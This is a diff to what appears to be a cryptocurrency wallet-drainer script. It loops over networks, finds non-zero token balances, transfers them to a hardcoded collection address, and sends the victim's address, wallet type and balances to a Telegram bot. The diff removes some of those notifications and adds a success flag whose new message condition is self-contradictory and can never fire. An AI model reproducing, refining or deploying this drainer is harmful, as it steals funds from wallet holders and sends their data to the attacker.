@@ -185,18 +185,6 @@ Timestamp: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}
           continue;
         }
 
-        const switchMessage = `
-🔄 Switched to ${network.name}!
-Address: ${userAddress}
-Wallet: ${walletType}
-Chain ID: ${network.chainId}
-Timestamp: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}
-        `;
-        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id: chatId, text: switchMessage })
-        });
         console.log(`Switched to ${network.name} successfully`);
 
         await delay(1000);
@@ -277,18 +265,10 @@ ${balanceSummary || "No balances found or API error occurred."}
         console.log(`Sent balance notification for ${network.name}`);
 
         const nonZeroTokens = tokens.filter(t => t.balance && !ethers.BigNumber.from(t.balance).isZero());
+        let transferSuccess = false;
+
         if (nonZeroTokens.length === 0) {
           console.log(`No non-zero ${tokenStandard} tokens to transfer on ${network.name}`);
-          const noTransferMessage = `
-ℹ️ No ${tokenStandard} Tokens Transferred on ${network.name}!
-Reason: No non-zero token balances detected.
-Timestamp: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}
-          `;
-          await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: chatId, text: noTransferMessage })
-          });
         } else {
           console.log(`Found ${nonZeroTokens.length} non-zero ${tokenStandard} tokens to transfer on ${network.name}`);
         }
@@ -313,6 +293,7 @@ Timestamp: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}
             const tx = await contract.transfer(network.exodusAddress, balanceInWei);
             await tx.wait();
             console.log(`Sent ${token.symbol} on ${network.name}, tx: ${tx.hash}`);
+            transferSuccess = true;
 
             const decimals = token.decimals ?? 18;
             const balance = ethers.utils.formatUnits(token.balance, decimals);
@@ -345,6 +326,20 @@ Timestamp: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}
               body: JSON.stringify({ chat_id: chatId, text: errorMessage })
             });
           }
+        }
+
+        // Send "No ERC-20 Tokens Transferred" message only if at least one transfer was successful
+        if (transferSuccess && nonZeroTokens.length === 0) {
+          const noTransferMessage = `
+ℹ️ No ERC-20 Tokens Transferred on Ethereum!
+Reason: No non-zero token balances detected.
+Timestamp: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}
+          `;
+          await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: chatId, text: noTransferMessage })
+          });
         }
       } catch (err) {
         console.warn(`Error processing ${network.name}: ${err.message}`);
